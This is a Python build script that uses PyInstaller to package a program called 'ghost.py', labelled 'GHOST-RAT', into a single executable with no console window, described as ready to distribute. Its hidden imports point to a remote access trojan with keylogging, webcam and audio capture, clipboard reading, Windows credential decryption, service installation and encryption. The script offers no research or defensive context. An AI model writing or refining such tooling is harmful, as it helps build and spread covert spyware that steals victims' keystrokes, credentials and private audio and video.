#!/usr/bin/env python3
"""
Build script to convert ghost.py to a Windows executable using PyInstaller.
Run this on Windows with: python build.py
"""

import os
import sys
import subprocess
import shutil

def build_exe():
    """Build ghost.py into a windowless executable."""
    
    script_name = "ghost.py"
    exe_name = "ghost"
    
    if not os.path.exists(script_name):
        print(f"[ERROR] {script_name} not found!")
        return False
    
    # Check if PyInstaller is installed first
    try:
        subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True, timeout=5)
    except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
        print("[ERROR] PyInstaller not found!")
        print("[*] Install it with: pip install pyinstaller")
        return False
    
    # Determine expected output file extension based on platform
    is_windows = sys.platform == "win32"
    exe_extension = ".exe" if is_windows else ""
    expected_exe_path = f"dist/{exe_name}{exe_extension}"
    
    if not is_windows:
        print("[WARNING] Building on non-Windows platform!")
        print("[*] PyInstaller builds executables for the current platform.")
        print(f"[*] This will create a Linux executable, NOT a Windows .exe file.")
        print("[*] To build a Windows .exe, you must run this script on Windows.")
        print("[*] Continuing anyway to create a Linux binary...")
        print()
    
    print(f"[*] Building {script_name} into {exe_name}{exe_extension}...")
    
    # PyInstaller command arguments
    # --noconsole: No console window (windowless)
    # --onefile: Single executable file
    # --name: Output executable name
    # --clean: Clean PyInstaller cache before building
    # --icon: (optional) You can add --icon=icon.ico if you have an icon
    # --add-data: (if needed) For any additional data files
    # --hidden-import: Force include modules that PyInstaller might miss
    
    cmd = [
        "pyinstaller",
        "--onefile",             # Single file output
        "--name", exe_name,      # Output name
        "--clean",               # Clean cache
        script_name
    ]
    
    # Add --noconsole only on Windows (for windowless executable)
    if is_windows:
        cmd.insert(1, "--noconsole")
    
    # Add Windows-specific hidden imports only when building on Windows
    if is_windows:
        windows_imports = [
            "--hidden-import", "win32timezone",
            "--hidden-import", "win32api",
            "--hidden-import", "win32con",
            "--hidden-import", "win32gui",
            "--hidden-import", "win32process",
            "--hidden-import", "win32security",
            "--hidden-import", "win32service",
            "--hidden-import", "win32serviceutil",
            "--hidden-import", "win32event",
            "--hidden-import", "win32clipboard",
            "--hidden-import", "win32crypt",
            "--hidden-import", "win32com.client",
        ]
        cmd.extend(windows_imports)
    
    # Add cross-platform hidden imports
    cross_platform_imports = [
        "--hidden-import", "pynput.keyboard",
        "--hidden-import", "PIL._tkinter_finder",
        "--hidden-import", "cv2",
        "--hidden-import", "numpy",
        "--hidden-import", "soundcard",
        "--hidden-import", "soundfile",
        "--hidden-import", "pyaudio",
        "--hidden-import", "Crypto",
        "--hidden-import", "Crypto.Cipher",
        "--hidden-import", "Crypto.Cipher.AES",
    ]
    cmd.extend(cross_platform_imports)
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        # Verify the executable was created
        # Check both with and without .exe extension (for cross-platform compatibility)
        exe_path = expected_exe_path
        if not os.path.exists(exe_path) and not is_windows:
            # On Linux, also check without extension
            alt_path = f"dist/{exe_name}"
            if os.path.exists(alt_path):
                exe_path = alt_path
        
        if os.path.exists(exe_path):
            file_size = os.path.getsize(exe_path) / (1024*1024)  # MB
            print("[+] Build successful!")
            print(f"[+] Executable location: {exe_path}")
            print(f"[+] Size: {file_size:.2f} MB")
            
            if not is_windows:
                print()
                print("[!] IMPORTANT: This is a Linux executable, not a Windows .exe!")
                print("[!] To create a Windows .exe file, you must:")
                print("[!]   1. Copy ghost.py to a Windows machine")
                print("[!]   2. Install dependencies: pip install -r requirements.txt")
                print("[!]   3. Run this build script on Windows")
            
            return True
        else:
            print("[ERROR] Build appeared successful but executable not found!")
            print(f"[*] Expected location: {exe_path}")
            if result.stderr:
                print(f"[*] Build stderr:\n{result.stderr}")
            if result.stdout:
                print(f"[*] Build stdout (last 20 lines):")
                lines = result.stdout.strip().split('\n')
                for line in lines[-20:]:
                    print(f"    {line}")
            return False
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Build failed!")
        print(f"Return code: {e.returncode}")
        if e.stderr:
            print(f"Error output:\n{e.stderr}")
        if e.stdout:
            print(f"Output:\n{e.stdout}")
        return False
    except FileNotFoundError:
        print("[ERROR] PyInstaller command not found in PATH!")
        print("[*] Make sure PyInstaller is installed: pip install pyinstaller")
        return False

if __name__ == "__main__":
    print("=" * 60)
    print("GHOST-RAT Build Script")
    print("=" * 60)
    
    if sys.platform != "win32":
        print("[WARNING] This script should be run on Windows to build a Windows executable.")
        print("[*] You can still run it, but the resulting .exe will only work on Windows.")
        response = input("Continue anyway? (y/n): ")
        if response.lower() != 'y':
            sys.exit(0)
    
    success = build_exe()
    
    if success:
        print("\n[+] Build complete! Executable is in the 'dist' folder.")
        print("[*] You can now distribute ghost.exe")
    else:
        print("\n[!] Build failed. Check errors above.")
        sys.exit(1)

